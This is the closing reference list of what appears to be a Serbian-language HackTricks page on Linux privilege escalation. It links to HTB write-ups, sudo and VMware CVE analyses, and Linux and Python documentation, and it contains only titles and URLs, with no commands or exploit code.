- [15] [Peppo (Proving Grounds) writeup](https://muzec0318.github.io/posts/PG/peppo.html)
- [16] [Upoznajte D-BUS](https://www.linuxjournal.com/article/7744)
- [17] [Eskalacija privilegija na Linux-u putem SUID izvršnih datoteka](https://blog.certcube.com/suid-executables-linux-privilege-escalation/)
- [18] [Sudo, 2. deo – eskalacija privilegija na Linux-u](https://juggernaut-sec.com/sudo-part-2-lpe)
- [19] [Kako upravljati ACL-ovima na Linux-u](https://linuxconfig.org/how-to-manage-acls-on-linux)
- [20] [Redhat/CentOS root putem network-scripts](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)
- [21] [Šta je systemd?](https://www.linode.com/docs/guides/what-is-systemd/)
- [22] [0xdf – HTB Eureka (bash arithmetic injection putem logova, celokupan lanac)](https://0xdf.gitlab.io/2025/08/30/htb-eureka.html)
- [23] [GNU Bash Manual – BASH_ENV (startna datoteka za neinteraktivni režim)](https://www.gnu.org/software/bash/manual/bash.html#index-BASH_005fENV)
- [24] [0xdf – HTB Environment (sudo env_keep BASH_ENV → root)](https://0xdf.gitlab.io/2025/09/06/htb-environment.html)
- [25] [0xdf – HTB Previous (sudo terraform dev_overrides + TF_VAR symlink eskalacija privilegija)](https://0xdf.gitlab.io/2026/01/10/htb-previous.html)
- [26] [0xdf – HTB Slonik (kopiranje putem pg_basebackup cron-a → SUID bash)](https://0xdf.gitlab.io/2026/02/12/htb-slonik.html)
- [27] [NVISO – Šta god da navedete, VMware to podiže (CVE-2025-41244)](https://blog.nviso.eu/2025/09/29/you-name-it-vmware-elevates-it-cve-2025-41244/)
- [28] [Stratascale – CVE-2025-32463: eskalacija privilegija putem Sudo Chroot-a](https://www.stratascale.com/resource/cve-2025-32463-sudo-chroot-elevation-of-privilege/)
- [29] [Rich Mirch – ranjivosti za eskalaciju privilegija u Sudo-u CVE-2025-32462 i CVE-2025-32463](https://blog.mirch.io/sudo-elevation-of-privilege-vulnerabilities/)
- [30] [0xdf – HTB: Browsed](https://0xdf.gitlab.io/2026/03/28/htb-browsed.html)
- [31] [PEP 3147 – direktorijumi PYC repozitorijuma](https://peps.python.org/pep-3147/)
- [32] [Python importlib dokumentacija](https://docs.python.org/3/library/importlib.html)
- [33] [polkit/polkit issue #74](https://gitlab.freedesktop.org/polkit/polkit/issues/74)
- [34] [mirchr/security-research](https://github.com/mirchr/security-research/blob/master/vulnerabilities/CVE-2018-19788.sh)
- [35] [Tweet korisnika @paragonsec](https://twitter.com/paragonsec/status/1071152249529884674)
- [36] [redsiege.com - beleženje lozinki na Linux-u](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux)
- [37] [tech.feedyourhead.at - detalji o race condition-u u logrotate-u](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition)
- [38] [Python 3.10 dokumentacija – `site` i fajlovi za konfiguraciju putanja](https://docs.python.org/3.10/library/site.html)
- [39] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../../../banners/hacktricks-training.md}}
